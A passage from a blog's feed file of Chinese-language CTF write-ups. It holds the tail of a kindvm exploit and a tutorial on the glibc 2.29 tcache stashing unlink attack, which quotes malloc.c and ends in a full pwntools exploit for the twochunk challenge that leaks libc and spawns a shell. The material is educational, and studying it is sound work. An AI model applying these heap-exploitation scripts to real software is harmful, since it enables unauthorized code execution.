class="params">(addr,value)</span>:</span></span><br><span class="line">    ins = <span class="string">'\x80\x03'</span>+p32(addr)+<span class="string">'\x54\x00'</span></span><br><span class="line">    ins += <span class="string">'\x80\x03'</span>+p32(addr+<span class="number">1</span>)+<span class="string">'\x54\x00'</span></span><br><span class="line">    ins += <span class="string">'\x80\x03'</span>+p32(addr+<span class="number">2</span>)+<span class="string">'\x54\x00'</span></span><br><span class="line">    ins += <span class="string">'\x80\x03'</span>+p32(addr+<span class="number">3</span>)+<span class="string">'\x54\x00'</span></span><br><span class="line">    ins += <span class="string">'\x80\x00'</span>+<span class="string">'/bin'</span></span><br><span class="line">    ins += <span class="string">'\x80\x01'</span>+<span class="string">'/sh\x00'</span></span><br><span class="line">    ins += <span class="string">'\x99'</span></span><br><span class="line">    produce(ins)</span><br><span class="line">    start()</span><br><span class="line">    p.send(value)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gd</span><span class="params">(s = <span class="string">''</span>)</span>:</span></span><br><span class="line">    gdb.attach(p,s)</span><br><span class="line"></span><br><span class="line">gift()</span><br><span class="line">produce(<span class="string">"\x09\x11\x99"</span>)</span><br><span class="line">start()</span><br><span class="line">p.recvline()</span><br><span class="line">binary_base = int(p.recv(<span class="number">10</span>),<span class="number">16</span>) - <span class="number">0x6c0</span></span><br><span class="line">log.success(<span class="string">"binary_base:0x%x"</span>%binary_base)</span><br><span class="line"></span><br><span class="line">malloc_got = binary_base + <span class="number">0x2fcc</span></span><br><span class="line">read_one(malloc_got)</span><br><span class="line">p.recv()</span><br><span class="line">libc_base = u32(p.recv(<span class="number">4</span>)) - <span class="number">0x70f00</span></span><br><span class="line">log.success(<span class="string">"libc_base:0x%x"</span>%libc_base)</span><br><span class="line">free_hook = libc_base + <span class="number">0x1b38b0</span> </span><br><span class="line">system_addr = libc_base + <span class="number">0x3ada0</span></span><br><span class="line">write_one(free_hook,p32(system_addr))</span><br><span class="line">gd()</span><br><span class="line">free()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h3><p><a href="https://github.com/PDKT-Team/ctf/tree/master/seccon2018/kindvm#bahasa-indonesia" target="_blank" rel="noopener">https://github.com/PDKT-Team/ctf/tree/master/seccon2018/kindvm#bahasa-indonesia</a></p><p><a href="https://blog.csdn.net/qq_25201379/article/details/83548147" target="_blank" rel="noopener">https://blog.csdn.net/qq_25201379/article/details/83548147</a></p><p><a href="https://dittozzz.top/2019/09/28/VM-pwn-%E5%88%9D%E6%8E%A2/" target="_blank" rel="noopener">https://dittozzz.top/2019/09/28/VM-pwn-%E5%88%9D%E6%8E%A2/</a></p><p><a href="https://xz.aliyun.com/t/6865" target="_blank" rel="noopener">https://xz.aliyun.com/t/6865</a></p><p><a href="https://www.bilibili.com/read/cv5124780" target="_blank" rel="noopener">https://www.bilibili.com/read/cv5124780</a></p>]]></content>
      
      
      <categories>
          
          <category> pwn学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> gxzy </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>tcache_stashing_unlink_attack</title>
      <link href="/2020/04/10/tcache-stashing-unlink-attack/"/>
      <url>/2020/04/10/tcache-stashing-unlink-attack/</url>
      
        <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>tcache_stashing_unlink_attack是glibc2.29和glibc2.30下的一种新型攻击技巧</p><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>该利用原理与unsorted bin attack和house of lore攻击相似，首先来回顾一下它们两个</p><h4 id="unsorted-bin-attack"><a href="#unsorted-bin-attack" class="headerlink" title="unsorted bin attack"></a>unsorted bin attack</h4><p>在glibc2.27/malloc/malloc.c: 3777中</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* remove from unsorted list */</span></span><br><span class="line">unsorted_chunks (av)-&gt;bk = bck;</span><br><span class="line">bck-&gt;fd = unsorted_chunks (av);</span><br></pre></td></tr></table></figure><p>没有做任何检查，可以使bck-&gt;fd写入libc地址(av)</p><p>在glibc2.29/malloc/malloc.c: 3976中</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* remove from unsorted list */</span></span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim))</span><br><span class="line">  malloc_printerr (<span class="string">"malloc(): corrupted unsorted chunks 3"</span>);</span><br><span class="line">unsorted_chunks (av)-&gt;bk = bck;</span><br><span class="line">bck-&gt;fd = unsorted_chunks (av);</span><br></pre></td></tr></table></figure><p>做了检查，因此unsorted bin attack在glibc2.29中失效</p><h4 id="house-of-lore"><a href="#house-of-lore" class="headerlink" title="house of lore"></a>house of lore</h4><p>house of lore利用的是small bin分配时的unlink</p><p>参考链接：<a href="https://wiki.x10sec.org/pwn/heap/house_of_lore/" target="_blank" rel="noopener">https://wiki.x10sec.org/pwn/heap/house_of_lore/</a></p><p>在glibc2.23/malloc/malloc.c: 3397中</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   If a small request, check regular bin.  Since these "smallbins"</span></span><br><span class="line"><span class="comment">   hold one size each, no searching within bins is necessary.</span></span><br><span class="line"><span class="comment">   (For a large request, we need to wait until unsorted chunks are</span></span><br><span class="line"><span class="comment">   processed to find best fit. But for small ones, fits are exact</span></span><br><span class="line"><span class="comment">   anyway, so we can check now, which is faster.)</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (in_smallbin_range(nb)) &#123;</span><br><span class="line">    <span class="comment">// 获取 small bin 的索引</span></span><br><span class="line">    idx = smallbin_index(nb);</span><br><span class="line">    <span class="comment">// 获取对应 small bin 中的 chunk 指针</span></span><br><span class="line">    bin = bin_at(av, idx);</span><br><span class="line">    <span class="comment">// 先执行 victim= last(bin)，获取 small bin 的最后一个 chunk</span></span><br><span class="line">    <span class="comment">// 如果 victim = bin ，那说明该 bin 为空。</span></span><br><span class="line">    <span class="comment">// 如果不相等，那么会有两种情况</span></span><br><span class="line">    <span class="keyword">if</span> ((victim = last(bin)) != bin) &#123;</span><br><span class="line">        <span class="comment">// 第一种情况，small bin 还没有初始化。</span></span><br><span class="line">        <span class="keyword">if</span> (victim == <span class="number">0</span>) <span class="comment">/* initialization check */</span></span><br><span class="line">            <span class="comment">// 执行初始化，将 fast bins 中的 chunk 进行合并</span></span><br><span class="line">            malloc_consolidate(av);</span><br><span class="line">        <span class="comment">// 第二种情况，small bin 中存在空闲的 chunk</span></span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// 获取 small bin 中倒数第二个 chunk 。</span></span><br><span class="line">            bck = victim-&gt;bk;</span><br><span class="line">            <span class="comment">// 检查 bck-&gt;fd 是不是 victim，防止伪造</span></span><br><span class="line">            <span class="keyword">if</span> (__glibc_unlikely(bck-&gt;fd != victim)) &#123;</span><br><span class="line">                errstr = <span class="string">"malloc(): smallbin double linked list corrupted"</span>;</span><br><span class="line">                <span class="keyword">goto</span> errout;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 设置 victim 对应的 inuse 位</span></span><br><span class="line">            set_inuse_bit_at_offset(victim, nb);</span><br><span class="line">            <span class="comment">// 修改 small bin 链表，将 small bin 的最后一个 chunk 取出来</span></span><br><span class="line">            bin-&gt;bk = bck;</span><br><span class="line">            bck-&gt;fd = bin;</span><br><span class="line">            <span class="comment">// 如果不是 main_arena，设置对应的标志</span></span><br><span class="line">            <span class="keyword">if</span> (av != &amp;main_arena) set_non_main_arena(victim);</span><br><span class="line">            <span class="comment">// 细致的检查</span></span><br><span class="line">            check_malloced_chunk(av, victim, nb);</span><br><span class="line">            <span class="comment">// 将申请到的 chunk 转化为对应的 mem 状态</span></span><br><span class="line">            <span class="keyword">void</span> *p = chunk2mem(victim);</span><br><span class="line">            <span class="comment">// 如果设置了 perturb_type , 则将获取到的chunk初始化为 perturb_type ^ 0xff</span></span><br><span class="line">            alloc_perturb(p, bytes);</span><br><span class="line">            <span class="keyword">return</span> p;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>从下面的这部分我们可以看出</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">// 获取 small bin 中倒数第二个 chunk 。</span><br><span class="line">bck = victim-&gt;bk;</span><br><span class="line">// 检查 bck-&gt;fd 是不是 victim，防止伪造</span><br><span class="line">if (__glibc_unlikely(bck-&gt;fd != victim)) &#123;</span><br><span class="line">    errstr = &quot;malloc(): smallbin double linked list corrupted&quot;;</span><br><span class="line">    goto errout;</span><br><span class="line">&#125;</span><br><span class="line">// 设置 victim 对应的 inuse 位</span><br><span class="line">set_inuse_bit_at_offset(victim, nb);</span><br><span class="line">// 修改 small bin 链表，将 small bin 的最后一个 chunk 取出来</span><br><span class="line">bin-&gt;bk = bck;</span><br><span class="line">bck-&gt;fd = bin;</span><br></pre></td></tr></table></figure><p>如果我们可以修改 small bin 的最后一个 chunk 的 bk 为我们指定内存地址的fake chunk，并且同时满足之后的  bck-&gt;fd != victim 的检测，那么我们就可以使得 small bin 的 bk 恰好为我们构造的 fake  chunk。也就是说，当下一次申请 small bin 的时候，我们就会分配到指定位置的 fake chunk。</p><p>在glibc2.27和2.29中也没有做过多的检查</p><h4 id="tcache-stashing-unlink-attack"><a href="#tcache-stashing-unlink-attack" class="headerlink" title="tcache_stashing_unlink_attack"></a>tcache_stashing_unlink_attack</h4><p>参考链接：<a href="https://medium.com/@ktecv2000/hitcon-ctf-2019-quals-one-punch-man-pwn-292pts-3e94eb3fd312" target="_blank" rel="noopener">berming</a></p><p>在glibc2.29/malloc/malloc.c: 3664中</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">  <span class="comment">/* While we're here, if we see other chunks of the same size,</span></span><br><span class="line"><span class="comment">     stash them in the tcache.  */</span></span><br><span class="line">  <span class="keyword">size_t</span> tc_idx = csize2tidx (nb);</span><br><span class="line">  <span class="keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)</span><br><span class="line">    &#123;</span><br><span class="line">      mchunkptr tc_victim;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* While bin not empty and tcache not full, copy chunks over.  */</span></span><br><span class="line">      <span class="keyword">while</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count</span><br><span class="line">     &amp;&amp; (tc_victim = last (bin)) != bin)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (tc_victim != <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      bck = tc_victim-&gt;bk;</span><br><span class="line">      set_inuse_bit_at_offset (tc_victim, nb);</span><br><span class="line">      <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">set_non_main_arena (tc_victim);</span><br><span class="line">      bin-&gt;bk = bck;    <span class="comment">//类似house of lore</span></span><br><span class="line">      bck-&gt;fd = bin;    <span class="comment">//没有做任何检查，类似unsorted bin</span></span><br><span class="line"></span><br><span class="line">      tcache_put (tc_victim, tc_idx);</span><br><span class="line">            &#125;</span><br><span class="line">&#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure><p>可以看到，当small bin不为空而tcache不满时，可以达到与unsorted bin attack和house of lore相同的攻击效果。</p><p>看着挺有道理，但是当small bin不为空而tcache不满这两个条件在引入tcache之后似乎有点矛盾。因为<strong>我们不能越过Tcache向SmallBin中填入Chunk，也不能越过Tcache从SmallBin中取出Chunk。</strong>但是，事情总是充满玄机，这里不得不提calloc和unsorted bin中的last remainder与tcache的爱恨情仇。</p><p>1、<code>calloc</code>不会从<code>Tcache</code>拿<code>Chunk</code>，因此可以越过第二条矛盾“不能越过<code>Tcache</code>从<code>SmallBin</code>中取出<code>Chunk</code>”。</p><p>2、<code>Unsorted Bin</code>的<code>last remainder</code>基址，当申请的Chunk大于<code>Unsorted Bin</code>中Chunk的大小且其为<code>Unsorted Bin</code>中的唯一<code>Chunk</code>时，该<code>Chunk</code>不会进入<code>Tcache</code>。因此可以越过第一条矛盾“不能越过Tcache向SmallBin中填入Chunk”。</p><p>其实calloc与malloc的特性可以方式直接泄露libc，因为当我们使用malloc时会直接从tcache取chunk，tcache中的chunk不存在libc地址，而使用calloc时，会把chunk清零。但是malloc可以泄露堆地址。</p><h3 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h3><p>下面以gxzyCTF中的twochunk为例</p><h4 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h4><p>checksec</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] &apos;/mnt/hgfs/glibc2.29/twochunk/twochunk&apos;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure><p>程序功能较多</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">result = (<span class="keyword">signed</span> <span class="keyword">int</span>)mmap((<span class="keyword">void</span> *)<span class="number">0x23333000</span>, <span class="number">0x2000</span>uLL, <span class="number">3</span>, <span class="number">34</span>, <span class="number">-1</span>, <span class="number">0L</span>L);</span><br><span class="line">  buf = (<span class="keyword">void</span> *)(<span class="keyword">signed</span> <span class="keyword">int</span>)result;</span><br></pre></td></tr></table></figure><p>在0x23333000出mmap出了一块大小为2000的可读写空间，地址存放在bss段的buf中</p><p><img style="zoom:80%;" data-src="/2020/04/10/tcache-stashing-unlink-attack/1.png" class="lazyload"></p><p>在0x23333000处存放name和msg，同时有一次修改和打印name、msg的功能。</p><p>使用calloc申请堆块，大小为（0x80, 0x3ff ]，即small bin大小的堆块，同时最多申请两个，当size=0x23333可以使用一次malloc(0xE9)</p><p>free函数没问题</p><p>show函数只能使用一次</p><p>edit函数只能使用一次，有32字节溢出</p><p>存在后门函数，可以配合修改msg使用，前提是泄露libc地址</p><p>因此，这道题的目标就是泄露libc地址，刚好利用<code>类unsorted bin attack</code>可以将libc地址写道任意位置，我们可以写入0x23333000，然后利用打印name、msg函数泄露出来。</p><h4 id="利用过程"><a href="#利用过程" class="headerlink" title="利用过程"></a>利用过程</h4><p>首先，我们需要一个用来两个不同大小的chunk，一个未满，一个已满</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">5</span>):</span><br><span class="line">    add(<span class="number">0</span>,<span class="number">0x88</span>)</span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">    add(<span class="number">0</span>,<span class="number">0x190</span>)</span><br><span class="line">    free(<span class="number">0</span>)</span><br></pre></td></tr></table></figure><p>下面构造两个small bin</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#first smallbin</span></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x190</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x1a0</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x100</span>) <span class="comment">#还剩下0x90大小的chunk</span></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0xf0</span>)  <span class="comment">#Unsorted Bin的last remainder</span></span><br><span class="line">free(<span class="number">0</span>)</span><br></pre></td></tr></table></figure><p><img data-src="/2020/04/10/tcache-stashing-unlink-attack/2.png" class="lazyload"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0</span>,<span class="number">0xf0</span>) <span class="comment">#为malloc(E9)</span></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x190</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x1a0</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x100</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x190</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br></pre></td></tr></table></figure><p><img data-src="/2020/04/10/tcache-stashing-unlink-attack/3.png" class="lazyload"></p><p>泄露堆地址</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0</span>,<span class="number">23333</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">heap = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">log.success(<span class="string">"heap:"</span>+hex(heap))</span><br></pre></td></tr></table></figure><p>tcache stashing unlink</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">'\x00'</span>*<span class="number">0xf0</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x111</span>)+<span class="string">'\x00'</span>*<span class="number">0x100</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x91</span>)+p64(heap<span class="number">-0x250</span>)+p64(<span class="number">0x23333000</span><span class="number">-0x10</span>)</span><br><span class="line">edit(<span class="number">0</span>,payload)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x88</span>)</span><br></pre></td></tr></table></figure><p>此时堆布局如下</p><p><img data-src="/2020/04/10/tcache-stashing-unlink-attack/4.png" class="lazyload"></p><p>以上过程首先是<code>类house of lore</code>攻击</p><p>检查：bck-&gt;fd = victim(通过)</p><p>结果：bin-&gt;bk = bck;  bck-&gt;fd = bin;</p><p>接下来是<code>类unsorted bin attack</code></p><p>检查：无</p><p>结果：bin-&gt;bk = bck;  bck-&gt;fd = bin;</p><p>攻击之后的效果如下</p><p><img data-src="/2020/04/10/tcache-stashing-unlink-attack/5.png" class="lazyload"></p><p>完整exp如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.update(arch=<span class="string">'amd64'</span>,os=<span class="string">'linux'</span>,log_level=<span class="string">'debug'</span>)</span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>,<span class="string">'split'</span>,<span class="string">'-h'</span>]</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">"./twochunk"</span>)</span><br><span class="line">libc = ELF(<span class="string">"/lib/x86_64-linux-gnu/libc.so.6"</span>)</span><br><span class="line"></span><br><span class="line">r = <span class="keyword">lambda</span> x: p.recvuntil(x)</span><br><span class="line">s = <span class="keyword">lambda</span> x,y: p.sendafter(x,y)</span><br><span class="line">sl = <span class="keyword">lambda</span> x,y: p.sendlineafter(x,y)</span><br><span class="line"></span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    p = process(<span class="string">"./twochunk"</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"remote"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(idx,size)</span>:</span></span><br><span class="line">    s(<span class="string">"choice: "</span>,str(<span class="number">1</span>))</span><br><span class="line">    s(<span class="string">"idx: "</span>,str(idx))</span><br><span class="line">    s(<span class="string">"size: "</span>,str(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(idx)</span>:</span></span><br><span class="line">    s(<span class="string">"choice: "</span>,str(<span class="number">2</span>))</span><br><span class="line">    s(<span class="string">"idx: "</span>,str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">    s(<span class="string">"choice: "</span>,str(<span class="number">3</span>))</span><br><span class="line">    s(<span class="string">"idx: "</span>,str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx,content)</span>:</span></span><br><span class="line">    s(<span class="string">"choice: "</span>,str(<span class="number">4</span>))</span><br><span class="line">    s(<span class="string">"idx: "</span>,str(idx))</span><br><span class="line">    s(<span class="string">"content: "</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leave_msg</span><span class="params">(msg)</span>:</span></span><br><span class="line">    s(<span class="string">"choice: "</span>,str(<span class="number">6</span>))</span><br><span class="line">    s(<span class="string">"message: "</span>,msg)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gd</span><span class="params">()</span>:</span></span><br><span class="line">    gdb.attach(p)</span><br><span class="line">s(<span class="string">'name: '</span>,p64(<span class="number">0x23333020</span>)*<span class="number">6</span>)    </span><br><span class="line">s(<span class="string">'message: '</span>,p64(<span class="number">0x23333020</span>)*<span class="number">8</span>) </span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">5</span>):</span><br><span class="line">    add(<span class="number">0</span>,<span class="number">0x88</span>)</span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">    add(<span class="number">0</span>,<span class="number">0x190</span>)</span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line"><span class="comment">#make two small bin</span></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x190</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x1a0</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x100</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0xf0</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0xf0</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x190</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x1a0</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x100</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x190</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">23333</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">heap = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">log.success(<span class="string">"heap:"</span>+hex(heap))</span><br><span class="line">payload = <span class="string">'\x00'</span>*<span class="number">0xf0</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x111</span>)+<span class="string">'\x00'</span>*<span class="number">0x100</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x91</span>)+p64(heap<span class="number">-0x250</span>)+p64(<span class="number">0x23333000</span><span class="number">-0x10</span>)</span><br><span class="line">edit(<span class="number">0</span>,payload)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x88</span>)</span><br><span class="line">s(<span class="string">"choice: "</span>,str(<span class="number">5</span>))</span><br><span class="line">r(<span class="string">"message: "</span>)</span><br><span class="line">libc_base = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))<span class="number">-0x1eac60</span></span><br><span class="line">log.success(<span class="string">"libc_base:"</span>+hex(libc_base))</span><br><span class="line">payload = p64(libc_base+libc.symbols[<span class="string">'execve'</span>])</span><br><span class="line">payload += p64(<span class="number">0</span>)*<span class="number">5</span>+p64(libc_base+libc.search(<span class="string">'/bin/sh'</span>).next())+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)</span><br><span class="line">leave_msg(payload)</span><br><span class="line"><span class="comment"># gd()</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
